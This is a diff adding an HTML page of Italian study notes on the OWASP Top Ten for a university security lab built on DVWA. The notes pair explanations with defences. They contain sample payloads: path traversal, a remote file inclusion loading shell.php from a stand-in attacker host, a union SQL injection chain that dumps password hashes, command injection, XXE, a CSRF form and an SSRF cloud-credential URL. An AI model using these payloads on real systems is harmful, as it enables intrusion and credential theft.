@@ -1,0 +1,380 @@
+<!doctype html>
+<html lang="it" data-tema="scuro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>appunti_moduloS3_web_security.md · cockpit</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<a class="salta" href="#contenuto">Vai al contenuto</a>
+
+<header class="testata">
+  <a class="marchio" href="../index.html">cockpit</a>
+  <nav class="navigazione">
+    <a href="../index.html">Oggi</a>
+    <a href="../laurea.html">Laurea</a>
+    <a href="../corsi.html">Corsi</a>
+    <a href="../materiali.html" aria-current="page">Materiali</a>
+    <a href="../workflow.html">Workflow</a>
+    <a href="../diario.html">Diario</a>
+  </nav>
+  <div class="azioni">
+    <button type="button" class="cerca-apri" data-apri-ricerca>
+      <span>Cerca</span><kbd>Ctrl</kbd><kbd>K</kbd>
+    </button>
+    <button type="button" class="tema" data-cambia-tema aria-label="Cambia tema"></button>
+  </div>
+</header>
+
+<main id="contenuto" class="contenuto">
+<p class="metrica__etichetta">
+  appunti</p>
+<h1 class="titolo-pagina">appunti_moduloS3_web_security.md</h1>
+<p class="tenue"><a href="../../Vault/UniCode/claudeAppunti/APPUNTI SECURITY/appunti_moduloS3_web_security.md">Apri il file originale</a></p>
+<article class="prosa"><h1 id="appunti-modulo-s3-web-security-owasp-top-ten-2021">Appunti — Modulo S3: Web Security (OWASP Top Ten 2021)</h1>
+<p><strong>Corso</strong>: Lab Sicurezza Informatica T
+<strong>Basato su</strong>: lezione_moduloS3_web_security.md
+<strong>Data</strong>: 2026-06-24</p>
+<hr />
+<h2 id="visione-dinsieme-threat-model">Visione d'insieme — threat model</h2>
+<blockquote>
+<p>✅ Ottima sintesi iniziale: "l'attaccante sfrutta il fatto che l'applicazione non distingua tra dato ed istruzione" — è esattamente il principio unificante di S3. Tienilo come ancora mentale per tutte le 10 categorie OWASP.</p>
+</blockquote>
+<p>Un'<strong>applicazione web</strong> è un sistema che riceve input dall'esterno (parametri URL, form, cookie, header, file XML) e li usa per costruire query, comandi, pagine HTML, chiamate API. L'<strong>attaccante</strong> sfrutta il fatto che l'applicazione non distingua tra <strong>dato</strong> e <strong>istruzione</strong>: se l'input finisce in una query SQL senza sanificazione, l'utente può scrivere SQL; se finisce in HTML senza escaping, può scrivere JavaScript; se finisce in una chiamata di sistema, può scrivere comandi bash.</p>
+<p>La prospettiva del <strong>difensore</strong> è speculare: ogni punto dove l'input esterno influenza un interprete (database, shell, browser, parser XML) è una superficie d'attacco e va trattata con <strong>zero fiducia</strong>. Il principio fondamentale è <strong>validate input, escape output</strong> — valida quello che entra, codifica tutto quello che esce verso un interprete.</p>
+<hr />
+<h2 id="a1-broken-access-control-idor-file-disclosure-lfirfi">A1 — Broken Access Control: IDOR, File Disclosure, LFI/RFI</h2>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>ho capito IDOR come cambio di ID nell'URL, ma perché File Disclosure sarebbe 'IDOR applicato ai file'? E LFI/RFI come funzionano?</em>"</p>
+<p>La chiave è capire cos'è un "oggetto diretto" in IDOR: è qualsiasi risorsa identificata da un riferimento che l'utente controlla. Può essere un numero (<code>?id=42</code>) o un percorso (<code>?page=about.php</code>). Il problema è identico in entrambi i casi: l'applicazione usa quel riferimento senza verificare se chi lo chiede ne abbia il diritto.</p>
+<p><strong>IDOR classico</strong>: <code>?id=42</code> → cambi in <code>?id=43</code> → leggi i dati di un altro utente.</p>
+<p><strong>File Disclosure / Path Traversal</strong>: <code>?page=about.php</code> → cambi in <code>?page=../../../../etc/passwd</code> → il server legge e ti restituisce il file di sistema. È IDOR perché stai referenziando direttamente un file che non dovresti poter leggere, senza che l'applicazione verifichi. La sequenza <code>../</code> sale di una directory — ne metti quante servono finché arrivi alla root.</p>
+<p><strong>LFI (Local File Inclusion)</strong>: stessa vulnerabilità, ma il parametro viene usato da PHP per <em>includere</em> (ed eseguire) un file. Con <code>?page=../../../../etc/passwd</code> ottieni il contenuto del file; se riesci a puntare a un file PHP che hai in qualche modo caricato sul server, ottieni esecuzione di codice.</p>
+<p><strong>RFI (Remote File Inclusion)</strong>: uguale a LFI ma il parametro punta a un URL esterno. L'attaccante serve un file PHP malevolo dalla propria macchina con <code>python3 -m http.server 8081</code> e punta <code>?page=http://IP_PARROT:8081/shell.php</code>. Il server PHP scarica ed esegue quel file remoto — questo è RCE diretto. È disabilitato di default su DVWA perché troppo pericoloso anche in lab.</p>
+</blockquote>
+<p><strong>Tabella di confronto A1:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Tipo</th>
+<th>Riferimento usato</th>
+<th>Cosa ottieni</th>
+<th>Esempio payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IDOR classico</td>
+<td>ID numerico <code>?id=42</code></td>
+<td>Dati di un altro utente</td>
+<td><code>?id=43</code>, <code>?id=1</code></td>
+</tr>
+<tr>
+<td>File Disclosure</td>
+<td>Percorso file <code>?page=about.php</code></td>
+<td>Contenuto di file di sistema</td>
+<td><code>?page=../../../../etc/passwd</code></td>
+</tr>
+<tr>
+<td>LFI</td>
+<td>Percorso file → PHP include</td>
+<td>Esecuzione file locale</td>
+<td><code>?page=../../../../var/log/apache.log</code></td>
+</tr>
+<tr>
+<td>RFI</td>
+<td>URL remoto → PHP include</td>
+<td>Esecuzione file remoto (RCE)</td>
+<td><code>?page=http://IP_PARROT:8081/shell.php</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Difesa</strong>: non accettare mai percorsi come input utente. Se serve, usare una whitelist di pagine consentite — mai concatenare input direttamente in chiamate al filesystem.</p>
+<hr />
+<h2 id="a2-cryptographic-failures">A2 — Cryptographic Failures</h2>
+<p>Dati sensibili (credenziali, PII, dati finanziari) che circolano o vengono conservati senza protezione crittografica adeguata: password in chiaro nei log, algoritmi deboli (MD5), DB non protetto at rest.</p>
+<p>Su DVWA vedrai le password come hash MD5, ad esempio <code>5f4dcc3b5aa765d61d8327deb882cf99</code> (che è l'hash di "password"). MD5 è craccabile con rainbow table in secondi — manca di salt e key stretching. Funzioni corrette per le password: bcrypt, scrypt, Argon2.</p>
+<hr />
+<h2 id="a3-injection">A3 — Injection</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>nel risultato dell'injection vedo 'nome e cognome' come output normale — non è quello che il DB restituisce già?</em>"</p>
+<p>Sì, se inserisci <code>1</code> ottieni il nome e cognome dell'utente 1 — è il comportamento normale. Il punto dell'injection è <em>alterare la query</em> per ottenere cose che normalmente non potresti. Con <code>' OR 'a'='a</code> non stai chiedendo "dame l'utente con ID vuoto" — stai riscrivendo la logica SQL.</p>
+<p>La query originale del codice PHP è:
+<code>SELECT first_name, last_name FROM users WHERE user_id = '$id'</code>
+Quando inserisci <code>' OR 'a'='a</code>, la stringa <code>$id</code> diventa <code>' OR 'a'='a</code> e la query risultante è:
+<code>sql
+SELECT first_name, last_name FROM users WHERE user_id = '' OR 'a'='a'</code>
+La condizione <code>WHERE user_id = ''</code> è falsa (nessun utente ha ID vuoto), ma la seconda parte <code>OR 'a'='a'</code> è <strong>sempre vera</strong> (la lettera 'a' è sempre uguale a sé stessa). In SQL, <code>OR</code> funziona come in logica: se almeno una delle condizioni è vera, la riga passa il filtro. Risultato: tutte le righe della tabella passano il filtro WHERE e vengono restituite. Stai "cortocircuitando" il WHERE.</p>
+<p><strong>Risposta alla domanda</strong>: "<em>Union Based — nel pratico cosa significa 'concatenare i risultati di due SELECT'?</em>"</p>
+<p>In SQL, <code>UNION</code> appende i risultati di una seconda SELECT sotto quelli della prima, come se aggiungessi righe in fondo alla tabella risultante. Il vincolo è che le due SELECT devono avere lo stesso numero di colonne (altrimenti SQL non sa come allinearle).</p>
+<p>La query originale seleziona 2 colonne (first_name, last_name). Appendendo <code>UNION SELECT 'ciao','mondo'</code> ottieni come risultato aggiuntivo una riga con first_name='ciao' e last_name='mondo'. Ma puoi mettere qualsiasi cosa al posto di quelle stringhe — inclusi valori di sistema come <code>@@version</code>.</p>
+<p><strong>Risposta alla domanda</strong>: "<em>come coi NULL progressivi capisco il numero di colonne?</em>"</p>
+<p><code>NULL</code> è compatibile con qualsiasi tipo di colonna in SQL. Quindi <code>' union select NULL,NULL #</code> non fallisce per tipo sbagliato — fallisce solo se il numero di colonne non corrisponde. L'algoritmo: parti da 1 NULL, aggiungi un NULL alla volta finché la query restituisce risultato invece di errore. Quando funziona, sai il numero esatto di colonne.</p>
+<p><code>' union select NULL #        → Errore: numero colonne diverso
+' union select NULL,NULL #   → Risultato! → la query originale ha 2 colonne</code></p>
+<p><strong>Risposta alla domanda</strong>: "<em>cosa significa 'ho accesso a tutto il DB e non solo alla tabella originale'?</em>"</p>
+<p>La query originale stava solo dentro la tabella <code>users</code> del database <code>dvwa</code>. Con Union Based puoi fare SELECT su qualsiasi tabella di qualsiasi database presente nel DBMS — il tuo UNION non è legato alla tabella della query originale. Puoi interrogare <code>information_schema.schemata</code> per listare tutti i database, poi <code>information_schema.tables</code> per listare tutte le tabelle di ogni database, poi <code>information_schema.columns</code> per listare le colonne. Una volta che conosci la struttura, puoi fare SELECT su qualsiasi dato — password di altri database, configurazioni, qualsiasi cosa stia nel DBMS.</p>
+<p>Il <code>#</code> finale è fondamentale: commenta il resto della query originale (che aveva ancora un <code>'</code> di chiusura) — senza di lui la sintassi sarebbe invalida.</p>
+</blockquote>
+<p><strong>Sequenza Union Based completa</strong> (catena logica, non walkthrough):</p>
+<pre><code>Scopri numero colonne:
+' union select NULL,NULL #   → 2 colonne
+
+Estrai metadati di sistema:
+' union select NULL,@@version #     → versione MySQL
+' union select NULL,database() #    → database corrente: dvwa
+
+Enumera struttura:
+' union select null,schema_name from information_schema.schemata #
+' union select null,table_name from information_schema.tables where table_schema='dvwa' #
+' union select null,column_name from information_schema.columns where table_name='users' #
+
+Estrai i dati:
+' union select user,password from users #   → hash MD5 di tutte le password
+</code></pre>
+<h3 id="command-injection">Command Injection</h3>
+<blockquote>
+<p><strong>Risposta / inserimento esempio richiesto</strong>:</p>
+</blockquote>
+<p>La form di DVWA accetta un IP, lo passa a <code>ping</code> via <code>exec()</code> PHP senza filtrare l'input. In bash:
+- <strong><code>;</code></strong> separa comandi: <code>cmd1; cmd2</code> — esegue <code>cmd2</code> <strong>sempre</strong>, indipendentemente dall'exit code di <code>cmd1</code>
+- <strong><code>&amp;&amp;</code></strong> è AND logico: <code>cmd1 &amp;&amp; cmd2</code> — esegue <code>cmd2</code> <strong>solo se</strong> <code>cmd1</code> ha avuto successo (exit code 0)</p>
+<p>Nel contesto del form:</p>
+<pre><code>127.0.0.1; ls       → ping gira, poi ls gira sempre
+127.0.0.1 &amp;&amp; ls     → ping gira, ls gira solo se ping ha avuto successo
+; ls                → ping fallisce su input non-IP, ma con ; ls gira comunque
+</code></pre>
+<p>Per l'attaccante <code>;</code> è più affidabile: funziona anche con input non valido come IP. Command injection è RCE: con <code>; cat /etc/passwd</code>, <code>; id</code>, <code>; whoami</code> esplori il sistema con i privilegi del webserver.</p>
+<h3 id="xss-cross-site-scripting">XSS — Cross-Site Scripting</h3>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>in che senso prospettiva dal server al browser? cos'è il motore JavaScript? perché viene colpito? che aspetto ha l'attacco? cosa differenzia i tre tipi?</em>"</p>
+<p><strong>Prima di tutto: cosa fa un browser</strong> — quando il browser riceve HTML dal server, lo "legge" e costruisce la pagina. Se trova un tag <code>&lt;script&gt;</code>, lo passa al suo <strong>motore JavaScript</strong> (un interprete JS integrato nel browser) che lo esegue. Questo motore ha accesso a tutto quello che è nella pagina: i cookie di sessione, il DOM, può fare richieste HTTP per conto della vittima.</p>
+<p><strong>Dove sta la vulnerabilità</strong> — SQL injection colpisce un interprete sul server (il database). XSS colpisce un interprete sul <em>client</em> (il browser della vittima). La superficie cambia: invece di estrarre dati dal DB, l'attaccante esegue codice nel browser di qualcun altro.</p>
+<p><strong>Come appare un attacco XSS nel concreto</strong>: immagina un form "scrivi il tuo nome" che poi mostra "Ciao, [nome]!" nella pagina. Se invece di scrivere "Mario" scrivi <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>, la pagina non mostra "Ciao, [script tag]!" — il browser vede il tag <code>&lt;script&gt;</code> e lo esegue. Appare un alert. Innocuo qui, ma con <code>document.cookie</code> al posto di <code>alert()</code> rubi il cookie di sessione dell'utente che vede quella pagina.</p>
+<p><strong>Differenza tra i tre tipi</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Tipo</th>
+<th>Dove vive il payload</th>
+<th>Chi viene colpito</th>
+<th>Vettore tipico</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reflected</strong></td>
+<td>Solo nell'URL, il server lo echo-a nella risposta</td>
+<td>Chi clicca il link costruito</td>
+<td>Link in email di phishing</td>
+</tr>
+<tr>
+<td><strong>Stored</strong></td>
+<td>Nel database del server (commento, post, username)</td>
+<td>Tutti gli utenti che visitano la pagina</td>
+<td>Forum, campo nome utente</td>
+</tr>
+<tr>
+<td><strong>DOM-based</strong></td>
+<td>Solo nel browser, JS lo legge dall'URL e lo mette nel DOM</td>
+<td>Chi clicca il link costruito</td>
+<td>Come Reflected, ma non passa dal server</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Stored è il più pericoloso</strong>: il payload è persistente — chiunque visiti quella pagina esegue il codice malevolo, senza bisogno di convincerli a cliccare un link. <strong>DOM-based è il più difficile da rilevare</strong>: la risposta HTTP del server non contiene il codice malevolo, quindi i WAF server-side non lo vedono.</p>
+</blockquote>
+<hr />
+<h2 id="a4-insecure-design">A4 — Insecure Design</h2>
+<p>Vulnerabilità che non derivano da un bug implementativo ma dalla progettazione stessa del sistema — non c'è patch che tenga, va ridisegnata l'architettura.</p>
+<blockquote>
+<p><strong>Risposta alla richiesta "(aggiungi esempi)"</strong>:</p>
+<ul>
+<li>Password reset tramite domande di sicurezza prevedibili ("nome del primo animale domestico") — attaccabile con OSINT, non importa quanto sicura sia la password.</li>
+<li>Rate limiting assente su login: brute force senza limiti.</li>
+<li>Assenza di separazione tra ambienti test e produzione: credenziali di test attive in prod.</li>
+<li>Token di reset password che non scadono — un link di reset vecchio di mesi è ancora valido.</li>
+</ul>
+</blockquote>
+<hr />
+<h2 id="a5-security-misconfiguration">A5 — Security Misconfiguration</h2>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>'tutti i livelli dello stack' — cosa significa? e A5 è la base di qualunque attacco?</em>"</p>
+<p>"Stack" in questo contesto = tutti i componenti che compongono l'infrastruttura di un'app web, dall'hardware in su: <strong>servizi di rete</strong> (DNS, firewall), <strong>server web</strong> (nginx, Apache), <strong>application server</strong> (Tomcat, PHP-FPM), <strong>database</strong> (MySQL, PostgreSQL), <strong>framework</strong> (Laravel, Django), <strong>codice custom</strong>, <strong>VM</strong>, <strong>container</strong> (Docker), <strong>storage</strong> (S3, NFS).</p>
+<p>A5 non è "la base di qualunque attacco" nel senso che ogni attacco la richiede — è che una misconfiguration a qualsiasi livello può rendere possibile o amplificare attacchi di altre categorie. Esempio: credenziali di default (A5) permettono di accedere a un sistema → da lì puoi sfruttare SQLi (A3) che senza accesso non avresti potuto testare.</p>
+</blockquote>
+<h3 id="credenziali-di-default">Credenziali di default</h3>
+<blockquote>
+<p><strong>Risposta alla richiesta "(Spiega, ho capito ma non ho voglia di riscriverlo)"</strong> — lo scrivo io:</p>
+</blockquote>
+<p>Un'applicazione installata con credenziali di default (<code>admin</code>/<code>admin</code>, <code>admin</code>/<code>password</code>, <code>root</code>/<code>root</code>) è vulnerabile immediatamente. Esistono database pubblici online con le credenziali di default di migliaia di dispositivi hardware, DBMS, immagini Docker/VM. Su DVWA usi proprio <code>admin</code>/<code>password</code> — è la credenziale di default dell'installer, mai cambiata. Brute force con Hydra/cewl trova queste credenziali in secondi.</p>
+<h3 id="cifrari-tls-deboli">Cifrari TLS deboli</h3>
+<p>Versioni di protocollo o cifrari obsoleti espongono la comunicazione anche senza bug applicativi. Da evitare: SSL, TLSv1.0, TLSv1.1, RC2, RC4, DES. Da preferire: TLSv1.2+, cifrari 128+ bit, Forward Secrecy (PFS), chiavi 2048+ bit, SHA-2. Strumenti: ssllabs.com, htbridge.com.</p>
+<h3 id="http-security-headers">HTTP Security Headers</h3>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>non ho capito un cazzo, cosa sono, come funzionano, cosa fanno</em>"</p>
+<p>Partiamo da cosa sono: <strong>gli header HTTP</strong> sono righe di metadati che viaggiano in ogni risposta dal server al browser, prima del corpo della pagina. Normalmente non li vedi — sono "dietro le quinte". Gli header di sicurezza sono header che il server aggiunge specificamente per <em>istruire il browser</em> su come comportarsi in modo sicuro con quella risposta.</p>
+<p>Pensa al server che dice al browser: "ehi, non caricare questa pagina dentro iframe di altri siti", oppure "non mettere in cache questa risposta perché contiene dati sensibili", oppure "esegui solo script che vengono da me, non da siti esterni". Il browser rispetta queste istruzioni.</p>
+<p>I principali:</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>Cosa dice al browser</th>
+<th>Perché serve</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>X-Frame-Options: DENY</code></td>
+<td>"Non caricarmi in un iframe di nessun sito"</td>
+<td>Previene clickjacking (attaccante nasconde la pagina sotto un elemento cliccabile)</td>
+</tr>
+<tr>
+<td><code>X-XSS-Protection: 1; mode=block</code></td>
+<td>"Attiva il filtro XSS integrato, blocca se trovi qualcosa"</td>
+<td>Mitiga Reflected XSS (legacy, supporto browser ridotto)</td>
+</tr>
+<tr>
+<td><code>Content-Security-Policy: default-src 'self'</code></td>
+<td>"Esegui/carica risorse solo dalla mia stessa origine"</td>
+<td>Blocca script iniettati da origini esterne (mitiga XSS stored e DOM)</td>
+</tr>
+<tr>
+<td><code>X-Content-Type-Options: nosniff</code></td>
+<td>"Non indovinare il tipo del file, usa solo quello dichiarato"</td>
+<td>Previene MIME-sniffing: script mascherato da immagine non viene eseguito</td>
+</tr>
+<tr>
+<td><code>Cache-Control: no-store</code></td>
+<td>"Non memorizzare questa risposta nella cache"</td>
+<td>Dati sensibili (credenziali, token) non restano in cache locale o proxy</td>
+</tr>
+<tr>
+<td><code>Strict-Transport-Security</code> (HSTS)</td>
+<td>"Per questa durata, parla con me solo in HTTPS"</td>
+<td>Previene attacchi HTTP stripping (downgrade da HTTPS a HTTP)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sop-e-cors">SOP e CORS</h3>
+<blockquote>
+<p><strong>Risposta alla richiesta "inserisci spiegazione e confronto tra i due"</strong>:</p>
+</blockquote>
+<p><strong>Same Origin Policy (SOP)</strong>: il browser impone che uno script caricato da <code>domain-a.com</code> non possa leggere risorse di <code>domain-b.com</code>. "Stessa origine" = stesso schema (http/https) + stesso dominio + stessa porta. Senza SOP, un script XSS iniettato su <code>bank.com</code> da un sito malevolo potrebbe leggere il cookie di sessione di <code>bank.com</code> e mandarlo all'attaccante.</p>
+<p><strong>CORS (Cross-Origin Resource Sharing)</strong>: il problema è che a volte due siti <em>legittimi</em> devono comunicare (es. <code>app.mioservizio.com</code> deve chiamare le API di <code>api.mioservizio.com</code>). CORS è il meccanismo ufficiale per fare eccezioni controllate alla SOP.</p>
+<p>Come funziona:
+1. Il browser, vedendo una richiesta cross-origin, aggiunge <code>Origin: domain-a.com</code>
+2. Il server di <code>domain-b.com</code> risponde con <code>Access-Control-Allow-Origin: domain-a.com</code> (o <code>*</code> per tutti)
+3. Se l'ACAO include l'origine richiedente, il browser lascia passare la risposta. Altrimenti la blocca.</p>
+<p><strong>CORS mal configurato</strong> (<code>Access-Control-Allow-Origin: *</code> con credenziali abilitato) annulla la protezione — qualsiasi sito può fare richieste autenticate per conto dell'utente.</p>
+<h3 id="xxe-xml-external-entities">XXE — XML External Entities</h3>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>non ho capito un cazzo, cosa sono, come funzionano, cosa fanno</em>"</p>
+<p><strong>Prima: cos'è XML</strong> — XML è un formato dati con tag come HTML (<code>&lt;ordine&gt;&lt;prodotto&gt;381&lt;/prodotto&gt;&lt;/ordine&gt;</code>). Alcune applicazioni ricevono dati XML da client (API, upload file).</p>
+<p><strong>Cosa sono le "external entities"</strong> — XML ha una funzionalità chiamata DTD (Document Type Definition) che permette di definire scorciatoie: "ogni volta che vedi <code>&amp;xxe;</code> nel documento, sostituiscilo con [qualcosa]". Quel "qualcosa" può essere un file locale o un URL remoto — è questo il problema.</p>
+<p><strong>Come funziona l'attacco</strong>: l'attaccante invia all'applicazione un XML costruito ad hoc:
+<code>xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</code>
+Il parser XML vede <code>&amp;xxe;</code> e lo sostituisce con il contenuto di <code>/etc/passwd</code>. Poi l'applicazione usa quel valore (magari lo stampa in un messaggio di errore, o lo elabora) — e il contenuto del file di sistema appare nella risposta.</p>
+<p><strong>Varianti</strong>:
+- <code>SYSTEM "file:///etc/passwd"</code> → legge file locale
+- <code>SYSTEM "http://192.168.1.1/"</code> → fa richiesta HTTP verso rete interna (SSRF via XXE)
+- Billion Laughs Attack: entità annidate che si espandono esponenzialmente → DoS per esaurimento memoria</p>
+<p><strong>Difesa</strong>: disabilitare il supporto alle external entity nel parser XML (configurazione del parser, non del codice applicativo), o usare JSON invece di XML dove possibile.</p>
+</blockquote>
+<hr />
+<h2 id="a6-vulnerable-and-outdated-components">A6 — Vulnerable and Outdated Components</h2>
+<p>Librerie, framework, OS con CVE note e non patchate. Casi famosi: Heartbleed (CVE-2014-0160, OpenSSL — lettura memoria server), ShellShock (CVE-2014-6271, Bash — RCE via variabili d'ambiente), GHOST (CVE-2015-0235, Linux glibc — buffer overflow in DNS). Impatto: qualsiasi cosa (RCE, AAA violations).</p>
+<hr />
+<h2 id="a7-identification-and-authentication-failures">A7 — Identification and Authentication Failures</h2>
+<p>Il <strong>session management</strong> mantiene lo stato di autenticazione attraverso un cookie che il browser include automaticamente in ogni richiesta successiva al login (HTTP è stateless — senza questo meccanismo ogni click richiederebbe un nuovo login).</p>
+<h3 id="session-fixation">Session Fixation</h3>
+<blockquote>
+<p><strong>Risposta alla domanda "(correggi se sbaglio)"</strong> — la tua descrizione è corretta nel meccanismo principale:</p>
+</blockquote>
+<p>L'attaccante apre una sessione anonima e ottiene un token (<code>sessionID=123XYZ</code>). Costruisce un link <code>https://bank.com/login?sessionID=123XYZ</code> e convince la vittima a usarlo (phishing). La vittima si autentica — il server ora associa la sessione autenticata al token <code>123XYZ</code>. L'attaccante usa quel token per impersonare la vittima. ✅</p>
+<p>Aggiungo: il token è vulnerabile anche in altri modi — se è <strong>prevedibile</strong> (sequenziale, es. <code>sessionID=1001</code>, <code>1002</code>, <code>1003</code>), se è <strong>trasmesso in HTTP</strong> (intercettabile in rete), se <strong>non scade</strong> dopo inattività, se <strong>non viene invalidato al logout</strong>.</p>
+<h3 id="csrf-cross-site-request-forgery">CSRF — Cross-Site Request Forgery</h3>
+<blockquote>
+<p><strong>Risposta alla richiesta "spiega con l'esempio attacker.com e mybank.com"</strong>:</p>
+</blockquote>
+<p>La vittima è autenticata su <code>mybank.com</code> — ha un cookie di sessione valido nel browser.</p>
+<p>Visita <code>attacker.com</code>, che contiene questa pagina nascosta:</p>
+<pre><code class="language-html">&lt;form action=&quot;https://mybank.com/transfer.jsp&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;recipient&quot; value=&quot;attacker&quot;&gt;
+  &lt;input name=&quot;amount&quot; value=&quot;1000&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+</code></pre>
+<p>Il browser vede il form, lo compila con i valori preimpostati e lo invia automaticamente a <code>mybank.com</code>. Il punto cruciale: quando il browser fa questa richiesta verso <code>mybank.com</code>, <strong>include automaticamente il cookie di sessione</strong> di mybank — perché è una regola del browser includere i cookie del dominio in ogni richiesta verso quel dominio, indipendentemente da dove viene generata la richiesta.</p>
+<p><code>mybank.com</code> riceve: POST <code>/transfer.jsp</code> + cookie di sessione valido + <code>recipient=attacker&amp;amount=1000</code>. Non riesce a distinguerla da una richiesta legittima.</p>
+<p><strong>Mitigazione</strong>: CSRF token — un segreto univoco nascosto in ogni form, che solo il sito legittimo conosce e può verificare. Il sito malevolo non può includerlo perché non lo conosce (SOP gli impedisce di leggere le pagine di mybank).</p>
+<p>⚠️ <strong>Distinzione per l'esame</strong>: CSRF sfrutta l'<em>autenticazione</em> già presente (il cookie), non un problema di autorizzazione. La risposta a "cosa fa CSRF?" è: sfrutta che il browser autentica automaticamente le richieste verso il dominio.</p>
+<hr />
+<h2 id="a8-software-and-data-integrity-failures">A8 — Software and Data Integrity Failures</h2>
+<blockquote>
+<p>⚠️ Questa sezione non era presente negli appunti grezzi.</p>
+</blockquote>
+<p>Vulnerabilità da insufficiente tutela dell'integrità del codice e dell'infrastruttura. Caso eclatante: <strong>SolarWinds Orion</strong> (2020) — aggiornamenti firmati legittimamente contenevano backdoor iniettata nel processo di build. 18.000 organizzazioni scaricarono l'aggiornamento, ~100 compromesse (Microsoft, Intel, Cisco, agenzie USA).</p>
+<p><strong>Insecure Deserialization</strong> (ex A8 OWASP 2017, ora qui): serializzazione = oggetto → stream di byte per rete/storage; deserializzazione = stream → oggetto. Se il deserializzatore accetta stream non fidati (cookie, parametri HTTP, API) senza verificarne l'integrità, un attaccante può costruire uno stream che esegue codice arbitrario al momento della deserializzazione (Java/.NET) o eleva i propri privilegi. Mitigazioni: non deserializzare dati non fidati, librerie con strict type checking, sandboxing.</p>
+<hr />
+<h2 id="a9-security-logging-and-monitoring-failures">A9 — Security Logging and Monitoring Failures</h2>
+<blockquote>
+<p><strong>Attenzione terminologica</strong>: negli appunti grezzi hai scritto "sistema di login" — è un lapsus, si tratta di <strong>logging</strong> (registrazione eventi), non di login (autenticazione). Sono due cose diverse.</p>
+</blockquote>
+<p>Non è una vulnerabilità di attacco diretto, ma l'assenza di logging adeguato trasforma un attacco rilevabile in uno che passa inosservato per settimane. Errori comuni: non tracciare accessi falliti (il brute force non viene rilevato), non dettagliare gli eventi loggati, non proteggere i log da alterazione, non definire procedure di risposta. Effetti: impossibile rilevare l'attacco in corso, impossibile ricostruire la catena di compromissione a posteriori, impossibile stimare il danno.</p>
+<hr />
+<h2 id="a10-server-side-request-forgery-ssrf">A10 — Server-Side Request Forgery (SSRF)</h2>
+<blockquote>
+<p><strong>Risposta alla domanda</strong>: "<em>non ho capito un cazzo, cosa sono, come funzionano, cosa fanno</em>"</p>
+<p><strong>Il concetto base</strong>: un server che fa richieste HTTP "per conto" dell'utente. Pensa a una funzionalità tipo "inserisci l'URL di un'immagine e te la mostriamo", oppure "controlla se questo feed RSS esiste". L'utente fornisce un URL → il server fa una richiesta HTTP a quell'URL → usa/mostra il risultato.</p>
+<p><strong>Il problema</strong>: il server vive <em>dentro</em> la rete interna. Ha accesso a risorse che l'utente esterno non può raggiungere direttamente: router (<code>192.168.1.1</code>), servizi interni (<code>http://db-interno.lan/</code>), e nei cloud provider AWS/GCP il metadata service (<code>http://169.254.169.254/</code>) che espone le credenziali dell'istanza.</p>
+<p><strong>Come funziona l'attacco</strong>: l'attaccante sostituisce l'URL legittimo con uno di questi indirizzi interni. Il server, fidandosi del parametro, fa la richiesta verso l'indirizzo interno e restituisce il risultato all'attaccante. Di fatto l'attaccante usa il server come "proxy" per esplorare la rete interna.</p>
+<p><strong>Esempio concreto</strong>: <code>?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> → il server AWS fa la richiesta al metadata service e restituisce le credenziali IAM dell'istanza. L'attaccante ora ha credenziali AWS valide.</p>
+<p><strong>Differenza da XXE→SSRF</strong>: in XXE è il parser XML che fa la richiesta interna (via <code>SYSTEM "http://..."</code>); qui è la logica applicativa stessa, intenzionalmente progettata per fare richieste esterne ma senza validare l'URL.</p>
+</blockquote>
+<hr />
+<h2 id="connessioni">Connessioni</h2>
+<ul>
+<li><strong>S1</strong>: gobuster e nmap usati in S1 sono i primi strumenti del lab S3 — enumeration precede ogni exploit web</li>
+<li><strong>S2</strong>: A7 (session fixation, CSRF) è il rovescio di S2 (autenticazione corretta)</li>
+<li><strong>S5 (iptables)</strong>: firewall rules che mitigano SSRF e limitano le connessioni in uscita del server</li>
+<li><strong>S10 (Suricata NIDS)</strong>: rileva pattern di SQLi, XSS, path traversal nel traffico di rete — A9 (Logging) diventa operativo qui</li>
+</ul>
+<!-- AUTO-LINKS -->
+<h2 id="connessioni-al-grafo">Connessioni al grafo</h2>
+<ul>
+<li>[[lezione_moduloS3_web_security]] — lezione sorgente di questi appunti</li>
+<li>[[appunti_moduloS1_offensive_security_enumerazione]] — prerequisito: enumeration surface</li>
+<li>[[appunti_moduloS2_autenticazione]] — prerequisito: session management, token</li>
+</ul>
+<!-- AUTO-LINKS:START -->
+<h2 id="collegati">🔗 Collegati</h2>
+<ul>
+<li>[[guida_lab_moduloS3_web_security]]</li>
+<li>[[lezione_moduloS3_web_security]]</li>
+</ul>
+<p><strong>Hub:</strong> [[master_map_studio]] · [[concept_maps]] · [[metodo_studio_esami_pratici]]</p>
+<!-- AUTO-LINKS:END --></article>
+</main>
+
+<footer class="pieDiPagina">
+  <p>Generato il 2026-09-02 16:48 da <code>scripts/build_ui.py</code>. Sola lettura.</p>
+</footer>
+
+<dialog class="ricerca" id="ricerca">
